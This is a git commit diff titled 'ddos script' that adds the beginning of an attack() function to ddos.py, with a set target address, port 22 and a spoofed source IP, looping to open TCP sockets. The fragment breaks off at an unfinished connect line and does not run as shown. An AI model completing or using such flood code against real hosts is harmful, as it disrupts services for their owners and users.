e0c10542b057a462f4002243ed22e23b900ccecc
dithermedaddy <moi@faanross.com>
2023-01-11 08:24:17 -0500

    ddos script

--- ddos.py
+++ ddos.py
@@ -6,7 +6,10 @@ target = '192.168.0.102'
 port = 22
 fake_ip = '66.6.69.42'
 
-
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect
 
 
 
